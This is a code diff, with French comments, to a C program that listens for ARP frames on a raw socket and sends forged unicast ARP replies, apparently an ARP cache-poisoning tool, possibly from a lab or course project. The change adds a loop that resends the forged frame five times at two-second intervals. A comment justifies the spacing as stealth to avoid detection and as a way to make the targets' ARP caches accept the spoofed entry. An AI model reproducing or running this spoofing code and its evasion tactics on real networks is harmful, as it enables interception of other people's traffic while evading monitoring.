@@ -51,8 +51,8 @@ int main(int argc, char **argv)
         memset(&network_frame_info, 0, sizeof(network_frame_info));
 
         /* La structure sockaddr_ll fournit des informations sur l'interface réseau à laquelle une trame a été reçue ou à travers laquelle
-        elle sera envoyée. Ces informations sont généralement liées à l'interface réseau locale sur la machine où le programme s'exécute.
-        La fonction recvfrom prend un type de sockaddr et la taille de se type et le remplie avec les informations*/
+        elle sera envoyée. Ces informations sont généralement liées à l'interface réseau locale sur la machine où le programme s'exécute
+        (ou on recoit le message). La fonction recvfrom prend un type de sockaddr et la taille de se type et le remplie avec les informations*/
         
         size_t recv = recvfrom(sockRaw, buf, SIZE_MAX_ARP, 0, (struct sockaddr *)&network_frame_info.network_interface, &len);
         if (recv <= 0)
@@ -74,21 +74,33 @@ int main(int argc, char **argv)
 
         create_frame_unicast_request(&network_frame_info.send_frame, &network_frame_info.recv_frame);
 
-        /*Envoie de la trame falsifie*/
+        /*Envoie de la trame falsifie. Furtivité : En espaçant les envois de trames ARP falsifiées, on reduit le risque d'attirer l'attention. 
+        Des envois simultanés de trames ARP falsifiées peuvent être détectés plus facilement.
+        Réussite de l'attaque : En espaçant les envois, on donne aux machines cibles du temps pour mettre à jour leurs caches ARP.
+        Cela peut augmenter les chances que l'attaque réussisse en trompant efficacement les machines cibles.*/
 
-        int ret = sendto(sockRaw, &network_frame_info.send_frame, sizeof(network_frame_info.recv_frame), MSG_CONFIRM, (struct sockaddr *)&network_frame_info.network_interface, sizeof(struct sockaddr_ll));
-        if (ret == -1)
-        {
-            printf("Send echec");
-        }
+        // if (network_frame_info.recv_frame.ether_src_mac[5] == 0x6e && network_frame_info.recv_frame.target_ip[5] == 0x02)
+        // {
+            for(int i = 0; i < 5; i++)
+            {
+                sleep(2);
+                int ret = sendto(sockRaw, &network_frame_info.send_frame, sizeof(network_frame_info.send_frame), 0, (struct sockaddr *)&network_frame_info.network_interface, sizeof(struct sockaddr_ll));
+                if (ret == -1)
+                {
+                printf("Send echec: %s\n", strerror(errno));
+                }
+            }
+        
+        
+            printf("-----------------------------------------------\033[1;32mNew ARP Trame recv\033[0m-----------------------------------------------\n");
+            printf("\n");
+            print_network_interface(&network_frame_info.network_interface);
+            print_arp_frame(&network_frame_info.recv_frame);
+            print_trame(buf, recv);
+            printf("----------------------------------------------------------------------------------------------------------------\n");
+            fflush(stdout);
+        // }
 
-        printf("-----------------------------------------------\033[1;32mNew ARP Trame recv\033[0m-----------------------------------------------\n");
-        printf("\n");
-        print_network_interface(&network_frame_info.network_interface);
-        print_arp_frame(&network_frame_info.recv_frame);
-        print_trame(buf, recv);
-        printf("----------------------------------------------------------------------------------------------------------------\n");
-        fflush(stdout);
     }
     return(0);
 }
